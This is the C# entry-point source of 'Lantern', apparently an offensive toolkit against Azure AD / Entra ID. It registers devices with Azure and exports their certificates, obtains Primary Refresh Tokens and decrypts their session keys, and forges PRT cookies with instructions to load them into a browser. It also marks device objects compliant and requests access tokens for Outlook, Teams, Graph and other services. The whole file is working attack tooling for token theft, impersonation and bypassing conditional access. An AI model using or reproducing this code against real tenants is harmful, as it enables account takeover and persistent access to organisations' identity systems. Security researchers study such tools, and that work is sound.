using CommandLine;
using CommandLine.Text;
using JWT;
using JWT.Serializers;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Lantern
{

   

    class Program
    {
        static void PrintBanner()
        {
            String banner = @"
.____                   __                       
|    |   _____    _____/  |_  ___________  ____  
|    |   \__  \  /    \   __\/ __ \_  __ \/    \ 
|    |___ / __ \|   |  \  | \  ___/|  | \/   |  \
|_______ (____  /___|  /__|  \___  >__|  |___|  /
        \/    \/     \/          \/           \/ ";
            Console.WriteLine("");
            Console.WriteLine(banner);
            Console.WriteLine("");
        }


        static int DisplayHelp(ParserResult<object> parserResult)
        {
            Console.WriteLine(HelpText.AutoBuild(parserResult, h => {
                h.AdditionalNewLineAfterOption = false;
                h.Heading = "Lantern 0.0.1-alpha"; //change header
                h.Copyright = ""; //change copyright text
                return h;
            }));
            return 1;
        }

        static int Main(string[] args)
        {
            PrintBanner();
            var parserResult = new Parser(c => c.HelpWriter = null).ParseArguments<P2POptions, NonceOptions, CookieOptions, TokenOptions, DeviceOptions, DeviceKeyOptions, UtilsOptions>(args);
            return parserResult.MapResult(
                    (P2POptions options) => RunP2PAction(options),
                    (DeviceKeyOptions options) => RunDeviceKeys(options),
                    (DeviceOptions options) => RunDevice(options),
                    (NonceOptions options) => RunNonce(options),
                    (CookieOptions options) => RunCookie(options),
                    (TokenOptions options) => RunToken(options),
                    (UtilsOptions options) => RunUtils(options),
                    errs => DisplayHelp(parserResult)
            );
        }

        private static int RunP2PAction(P2POptions opts)
        {
            String result = null;
            RSA rsa;
            if (opts.PRT != null && opts.Context != null && opts.DerivedKey != null && opts.Tenant != null && opts.UserName != null)
            {
                rsa = new RSACng(2048);
                string CN = "CN=" + opts.UserName;
                CertificateRequest req = new System.Security.Cryptography.X509Certificates.CertificateRequest(CN, rsa, System.Security.Cryptography.HashAlgorithmName.SHA256, System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                var csr = Convert.ToBase64String(req.CreateSigningRequest());
                string nonce = Helper.GetNonce2(opts.Proxy);
                
                var ctx = Helper.Hex2Binary(opts.Context);
                Dictionary<string, object> headerRaw = new Dictionary<string, object>
                    { 
                        { "ctx", ctx }
                    };

                byte[] data = Helper.Base64Decode(opts.PRT);
                string prtdecoded = Encoding.UTF8.GetString(data);

                Dictionary<string, object> payload = new Dictionary<string, object>
                {
                    { "iss", "aad:brokerplugin" },
                    { "aud", "login.microsoftonline.com" },
                    { "grant_type", "refresh_token" },
                    { "request_nonce", nonce },
                    { "scope", "openid aza ugs" },
                    { "refresh_token", prtdecoded },
                    { "client_id", AzClientIDEnum.WindowsClient },
                    { "cert_token_use", "user_cert" },
                    { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
                    { "csr", csr }
                };

                var JWT = Helper.signJWT(headerRaw, payload, opts.DerivedKey);
                result = Tokenator.GetP2PCertificate(JWT, opts.Tenant, opts.Proxy);
                
            }
            else if (opts.PFXPath != null && opts.Tenant != null && opts.DeviceName != null)
            {
                
                X509Certificate2 cert = new X509Certificate2(opts.PFXPath, opts.PFXPassword, X509KeyStorageFlags.Exportable);
                rsa = cert.GetRSAPrivateKey();
                var x5c = Convert.ToBase64String(cert.Export(X509ContentType.Cert));
                var CN = cert.Subject;
                CertificateRequest req = new CertificateRequest(CN, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var csr = Convert.ToBase64String(req.CreateSigningRequest());

                string nonce = Helper.GetNonce2(opts.Proxy);

                Dictionary<string, string> headerRaw = new Dictionary<string, string>
                    {
                        { "alg", "RS256" },
                        { "typ", "JWT" },
                        { "x5c", x5c }
                    };

                string headerRawString = JsonConvert.SerializeObject(headerRaw, Formatting.None);
                var header = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(headerRawString));

                var dnsNames = new List<string>();
                dnsNames.Add(opts.DeviceName);

                Dictionary<string, object> rawPayload = new Dictionary<string, object>
                    {
                        { "request_nonce", nonce },
                        { "win_ver", "10.0.18363.0" },
                        { "grant_type", "device_auth" },
                        { "cert_token_use", "device_cert" },
                        { "client_id", AzClientIDEnum.WindowsClient },
                        { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
                        { "csr",  csr },
                        { "netbios_name", "JuniTest" },
                        { "dns_names", dnsNames }
                    };

                string rawPayloadString = JsonConvert.SerializeObject(rawPayload, Formatting.None);
                var payload = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(rawPayloadString));

                var dataBin = System.Text.Encoding.UTF8.GetBytes(header + "." + payload);

                var signature = rsa.SignData(dataBin, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var signatureb64 = Helper.Base64UrlEncode(signature);

                var JWT = header + "." + payload + "." + signatureb64;

                result = Tokenator.GetP2PCertificate(JWT, opts.Tenant, opts.Proxy);
            }
            else 
            {
                Console.WriteLine("[-] Use --prt --derivedkey --context --tenant --username or with --pfxpath --tenant --devicename.... Other methods are not implemented yet...");
                return 1;
            }

            if (result != null)
            {
                JToken parsedResult = JToken.Parse(result);

                var binCert = Convert.FromBase64String(parsedResult["x5c"].ToString());

                X509Certificate2 cert = new X509Certificate2(binCert, "", X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable);
                string deviceId = cert.Subject.Split("=")[1];
                deviceId = deviceId.Split(",")[0];
                var keyPair = cert.CopyWithPrivateKey(rsa);
                byte[] certData = keyPair.Export(X509ContentType.Pfx, "");
                File.WriteAllBytes(deviceId + "-P2P.pfx", certData);

                String certHeader = "-----BEGIN PUBLIC KEY-----\n";
                String certend = "\n-----END PUBLIC KEY-----";

                string caCert = certHeader + parsedResult["x5c_ca"].ToString() + certend;
                File.WriteAllText(deviceId + "-P2P-CA.der", caCert);

                Console.WriteLine();
                Console.WriteLine("[+] Subject: " + cert.Subject);
                Console.WriteLine("[+] Issuer: " + cert.Issuer);
                Console.WriteLine("[+] CA file name: " + deviceId + "-P2P-CA.der");
                Console.WriteLine("[+] PFX file name: " + deviceId + "-P2P.pfx");
                return 0;
            } 
            return 1;
        }

        static int RunDeviceKeys(DeviceKeyOptions opts)
        {
            String refreshtoken = null;
            string tenantId = null;
            var serializer = new JsonNetSerializer();
            var urlEncoder = new JwtBase64UrlEncoder();
            var decoder = new JwtDecoder(serializer, urlEncoder);
            if (opts.RefreshToken != null)
            {
                string initToken = Tokenator.GetTokenFromRefreshToken(opts.RefreshToken, opts.Proxy, AzClientIDEnum.AzureMDM, AzResourceEnum.AzureMDM);
                string checkAccessToken = JToken.Parse(initToken)["access_token"].ToString();
                string decodedaccesstoken = decoder.Decode(checkAccessToken);
                JToken parsedAccessToken = JToken.Parse(decodedaccesstoken);
                String aud = parsedAccessToken["aud"].ToString();
                tenantId = parsedAccessToken["tid"].ToString();
                if (aud != AzResourceEnum.AzureMDM)
                {
                    Console.WriteLine("[-] AccessToken does not contain correct Audience...");
                    return 1;
                }
                refreshtoken = opts.RefreshToken;
            }
            else if (opts.UserName != null && opts.Password != null)
            {
                String initTokens = Tokenator.GetTokenFromUsernameAndPassword(opts.UserName, opts.Password, opts.Tenant, opts.Proxy, AzClientIDEnum.AzureMDM, AzResourceEnum.AzureMDM);
                if (initTokens == null)
                {
                    Console.WriteLine("[-] Authentication failed. Please check used credentials!");
                    return 1;
                }
                JToken parsedInitToken = JToken.Parse(initTokens);
                tenantId = Helper.GetTenantFromAccessToken(parsedInitToken["access_token"].ToString());
                refreshtoken = parsedInitToken["refresh_token"].ToString();               
            } else
            {
                Console.WriteLine("[-] For this you need a username and a password");
                Console.WriteLine("");
                return 1;
            }

            if (refreshtoken != null && tenantId != null)
            {
                X509Certificate2 cert = new X509Certificate2(opts.PFXPath, "", X509KeyStorageFlags.Exportable);
                var privateKey = cert.GetRSAPrivateKey();
                var x5c = Convert.ToBase64String(cert.Export(X509ContentType.Cert));

                string nonce = Helper.GetNonce2(opts.Proxy);

                Dictionary<string, string> headerRaw = new Dictionary<string, string>
                    {
                        { "alg", "RS256" },
                        { "typ", "JWT" },
                        { "x5c", x5c }
                    };

                string headerRawString = JsonConvert.SerializeObject(headerRaw, Formatting.None);
                var header = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(headerRawString));

                Dictionary<string, string> rawPayload = new Dictionary<string, string>
                    {
                        { "request_nonce", nonce },
                        { "scope", "openid aza ugs" },
                        { "win_ver", "10.0.18363.0" },
                        { "grant_type", "refresh_token" },
                        { "refresh_token", refreshtoken },
                        { "client_id", AzClientIDEnum.AzureMDM }

                    };

                string rawPayloadString = JsonConvert.SerializeObject(rawPayload, Formatting.None);
                var payload = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(rawPayloadString));

                var dataBin = System.Text.Encoding.UTF8.GetBytes(header + "." + payload);

                var signature = privateKey.SignData(dataBin, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var signatureb64 = Helper.Base64UrlEncode(signature);

                var JWT = header + "." + payload + "." + signatureb64;

                var formContent = new FormUrlEncodedContent(new[]
                   {
                    new KeyValuePair<string, string>("windows_api_version", "2.0"),
                    new KeyValuePair<string, string>("grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer"),
                    new KeyValuePair<string, string>("request", JWT),
                    new KeyValuePair<string, string>("client_info", "2")
                    });

                string result = Helper.PostToTokenEndpoint(formContent, opts.Proxy, tenantId);
                JToken parsedResult = JToken.Parse(result);
                
                if (parsedResult["refresh_token"] != null && parsedResult["session_key_jwe"] != null)
                {
                    string PRT = parsedResult["refresh_token"].ToString();
                    string JWE = parsedResult["session_key_jwe"].ToString();
                    string[] JWESplitted = JWE.Split(".");
                    byte[] encKey = Helper.Base64Decode(JWESplitted[1]);
                    var formatter = new System.Security.Cryptography.RSAOAEPKeyExchangeDeformatter(privateKey);
                    var dekey = formatter.DecryptKeyExchange(encKey);
                    string decryptionKey = Convert.ToBase64String(dekey);

                    Console.WriteLine();
                    Console.WriteLine("[+] Here is your PRT:");
                    Console.WriteLine();
                    Console.WriteLine(Convert.ToBase64String(Encoding.ASCII.GetBytes(PRT)));
                    Console.WriteLine();
                    Console.WriteLine("[+] Here is your session key:");
                    Console.WriteLine();
                    Console.WriteLine(decryptionKey);
                    Console.WriteLine("");

                    return 0;
                }
                else if (parsedResult["error_description"] != null)
                {
                    Console.WriteLine();
                    Console.WriteLine("[-] Something went wrong:");
                    Console.WriteLine();
                    Console.WriteLine(parsedResult["error_description"].ToString());
                    Console.WriteLine("");
                    return 1;
                }else
                {
                    Console.WriteLine();
                    Console.WriteLine("[-] Something went completly wrong... sorry");
                    Console.WriteLine();

                    return 1;
                }          
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[-] Something went completly wrong... sorry");
                Console.WriteLine();
                return 1;
            }
        }

        static int RunDevice(DeviceOptions opts)
        {
            String accesstoken = null;
            String upn = null;
            string tenantId = null;
            var serializer = new JsonNetSerializer();
            var urlEncoder = new JwtBase64UrlEncoder();
            var decoder = new JwtDecoder(serializer, urlEncoder);
            if (opts.JoinDevice) {
                if (opts.DeviceName != null)
                {
                    if (opts.AccessToken != null)
                    {

                        string decodedaccesstoken = decoder.Decode(opts.AccessToken);
                        JToken parsedAccessToken = JToken.Parse(decodedaccesstoken);
                        String aud = parsedAccessToken["aud"].ToString();
                        tenantId = parsedAccessToken["tid"].ToString();
                        upn = parsedAccessToken["upn"].ToString();
                        if (aud != AzClientIDEnum.DeviceMgmt)
                        {
                            Console.WriteLine("AccessToken does not contain correct Audience...");
                            return 1;
                        }
                        accesstoken = opts.AccessToken;
                    }
                    else
                    {
                        String initTokens = Tokenator.GetTokenFromUsernameAndPassword(opts.UserName, opts.Password, opts.Tenant, opts.Proxy);
                        if (initTokens == null)
                        {
                            Console.WriteLine("[-] Authentication failed! ");
                            return 1;
                        }
                        JToken parsedInitToken = JToken.Parse(initTokens);
                        if (parsedInitToken["error"] != null)
                        {
                            Console.WriteLine("[-] Something went wrong!");
                            Console.WriteLine("");
                            var beautified = parsedInitToken.ToString(Formatting.Indented);
                            Console.WriteLine(beautified);
                            Console.WriteLine("");
                            Console.WriteLine("[-] Good bye!");
                            return 1;
                        }
                        String initAccesstoken = decoder.Decode(parsedInitToken["access_token"].ToString());
                        String refreshtoken = parsedInitToken["refresh_token"].ToString();
                        var parsedInitAccessToken = JToken.Parse(initAccesstoken);
                        tenantId = parsedInitAccessToken["tid"].ToString();
                        upn = parsedInitAccessToken["upn"].ToString();
                        // Resource ID must have the value 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
                        string tokenForDevMgmt = Tokenator.GetTokenFromRefreshTokenToTenant(refreshtoken, tenantId, opts.Proxy, resourceID: "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9");
                        JToken parsedTokenForDevMgmt = JToken.Parse(tokenForDevMgmt);
                        accesstoken = parsedTokenForDevMgmt["access_token"].ToString();
                    }
                    if (accesstoken != null && upn != null && tenantId != null)
                    {

                        // https://github.com/Gerenios/AADInternals/blob/23831d5af045eeaa199ab098d29df9d4a60f460e/PRT_Utils.ps1#L95
                        RSACng rsa = new RSACng(2048);
                        string CN = "CN=7E980AD9-B86D-4306-9425-9AC066FB014A";
                        CertificateRequest req = new System.Security.Cryptography.X509Certificates.CertificateRequest(CN, rsa, System.Security.Cryptography.HashAlgorithmName.SHA256, System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                        var crs = Convert.ToBase64String(req.CreateSigningRequest());
                        var transportKey = Convert.ToBase64String(rsa.Key.Export(CngKeyBlobFormat.GenericPublicBlob));
                        var responseJoinDevice = MEManager.addNewDeviceToAzure(opts.Proxy, accesstoken, crs, transportKey, upn.Split("@")[1], opts.DeviceName, opts.RegisterDevice);
                        byte[] binCert = Convert.FromBase64String(responseJoinDevice.Certificate.RawBody.ToString());
                        X509Certificate2 cert = new X509Certificate2(binCert, "", X509KeyStorageFlags.UserKeySet | X509KeyStorageFlags.Exportable);

                        string deviceId = cert.Subject.Split("=")[1];
                        Console.WriteLine("[+]Device successfull added to Azure");
                        Console.WriteLine("");
                        Console.WriteLine("[+] The deviceId is: " + deviceId);
                        Console.WriteLine("");
                        Console.WriteLine(JToken.FromObject(responseJoinDevice).ToString(Formatting.Indented));
                        Console.WriteLine("");

                        // https://github.com/dotnet/runtime/issues/19581
                        var keyPair = cert.CopyWithPrivateKey(rsa);
                        byte[] certData = keyPair.Export(X509ContentType.Pfx, "");
                        File.WriteAllBytes(deviceId + ".pfx", certData);

                        Console.WriteLine("Device Certificate written to " + deviceId + ".pfx");
                        Console.WriteLine("");
                        return 0;
                    }
                }
                else
                {
                    Console.WriteLine("[-] You must set a device name (--devicename).");
                    return 1;
                }
            }else if (opts.MarkCompliant)
            {
                if (opts.ObjectID != null)
                {
                    if (opts.AccessToken != null)
                    {
                        int result = 0;
                        result = MEManager.MarkDeviceAsCompliant(opts.ObjectID, opts.AccessToken, opts.Proxy);
                        Console.WriteLine("[+] Responsecode is: " + result.ToString());
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("[-] This is currently only implemented with --accesstoken, get the correct token with --clientname Graph");
                        return 1;
                    }
                }
                else
                {
                    Console.WriteLine("[-] You must set an ObjectId id (--objectid)");
                    return 1;
                }
            }
            else
            {
                return 1;
            }

            return 1;
        }

        static int Error() {
            Console.WriteLine("Please specify an action and options!");
            Console.WriteLine(" ");
            return 1;
        
        }

        static int RunNonce(NonceOptions opts)
        {

            Console.WriteLine(Helper.getNonce(opts.Proxy));
            Console.WriteLine("");
            return 0;
        }

        static int RunCookie(CookieOptions opts)
        {
            string PRTCookie = null;
            if (opts.PRT != null && opts.DerivedKey != null && opts.Context != null)
            {
                PRTCookie = Helper.createPRTCookie(opts.PRT, opts.Context, opts.DerivedKey, opts.Proxy);
            }
            else if (opts.PRT != null & opts.SessionKey != null)
            {
                var context = Helper.GetByteArray(24);
                var decodedKey = Helper.Base64Decode(opts.SessionKey);
                var derivedKey = Helper.CreateDerivedKey(decodedKey, context);

                var contextHex = Helper.Binary2Hex(context);
                var derivedSessionKeyHex = Helper.Binary2Hex(derivedKey);

                PRTCookie = Helper.createPRTCookie(opts.PRT, contextHex, derivedSessionKeyHex, opts.Proxy);
            }
            else
            {
                Console.WriteLine("Please set the corect arguments.");
                return 1;
            }

            Console.WriteLine("[+] Here is your PRT-Cookie:");
            Console.WriteLine("");
            Console.WriteLine(PRTCookie);
            Console.WriteLine("");
            Console.WriteLine("[+] You can use it with this tool or add it to a browser.");
            Console.WriteLine("[+] Set as cookie \"x-ms-RefreshTokenCredential\" with HTTPOnly flag");
            Console.WriteLine("");

            return 0;
        }

        static int RunUtils(UtilsOptions opts)
        {
            if (opts.Domain != null)
            {
                String result = null;
                result = Utils.GetTenantIdToDomain(opts.Domain, opts.Proxy);
                if (result != null)
                {
                    Console.WriteLine("[+] The TenantID is: " + result);
                }
                else
                {
                    Console.WriteLine("[-] It seems the domain does not exist.");
                }
                return 0;
            }
            return 1;
        }

        static int RunToken(TokenOptions opts)
        {
            String result = null;
            if (opts.ClientName == null) { 
                result = Tokenator.getToken(opts, opts.ClientID, opts.ResourceID);
            } else{
                switch (opts.ClientName)
                {
                    case "Outlook":
                        result = Tokenator.getToken(opts, AzClientIDEnum.Outlook, AzResourceEnum.Outlook);
                        break;
                    case "Substrate":
                        result = Tokenator.getToken(opts, AzClientIDEnum.Substrate, AzResourceEnum.Substrate);
                        break;
                    case "Teams":
                        result = Tokenator.getToken(opts, AzClientIDEnum.Teams, AzResourceEnum.Teams);
                        break;
                    case "Graph":
                        result = Tokenator.getToken(opts, AzClientIDEnum.GraphAPI, AzResourceEnum.GraphAPI);
                        break;
                    case "MSGraph":
                        result = Tokenator.getToken(opts, AzClientIDEnum.MSGraph, AzResourceEnum.MSGraph);
                        break;
                    case "Webshell":
                        result = Tokenator.getToken(opts, AzClientIDEnum.WebShell, AzResourceEnum.WebShell);
                        break;
                    case "Core":
                        result = Tokenator.getToken(opts, AzClientIDEnum.Core, AzResourceEnum.Core);
                        break;
                    case "Office":
                        result = Tokenator.getToken(opts, AzClientIDEnum.OfficeApps, AzResourceEnum.OfficeApps);
                        break;
                    case "Intune":
                        result = Tokenator.getToken(opts, AzClientIDEnum.Intune, AzResourceEnum.Intune);
                        break;
                    case "Windows":
                        result = Tokenator.getToken(opts, AzClientIDEnum.WindowsClient, AzResourceEnum.WindowsClient);
                        break;
                    case "AzureMDM":
                        result = Tokenator.getToken(opts, AzClientIDEnum.AzureMDM, AzResourceEnum.AzureMDM);
                        break;
                    default:
                        Console.WriteLine("[-] Please choose Outlook, Substrate, Teams, Graph, MSGraph, Webshell, Core, Office, Intune, AzureMDM or WinClient");
                        return 1;
                }
            }
            if (result != null)
            {
                var serializer = new JsonNetSerializer();
                var urlEncoder = new JwtBase64UrlEncoder();
                var decoder = new JwtDecoder(serializer, urlEncoder);
                JToken parsedJson = JToken.Parse(result);

                if (parsedJson["error"] != null)
                {
                    Console.WriteLine("[-] Something went wrong!");
                    Console.WriteLine("");
                    
                    Console.WriteLine(parsedJson["error_description"].ToString());
                    Console.WriteLine("");
                    return 1;
                }
                                
                if (parsedJson["id_token"] != null)
                {
                    var id_token = decoder.Decode(parsedJson["id_token"].ToString());
                    var parsedIDToken = JToken.Parse(id_token);
                    parsedJson["id_token"] = parsedIDToken;
                }

                Console.WriteLine("[+] Here is your token:");
                Console.WriteLine("");
                var beautified = parsedJson.ToString(Formatting.Indented);
                Console.WriteLine(beautified);
                Console.WriteLine("");

                return 0;
            }
            return 1;
        }
    }
}
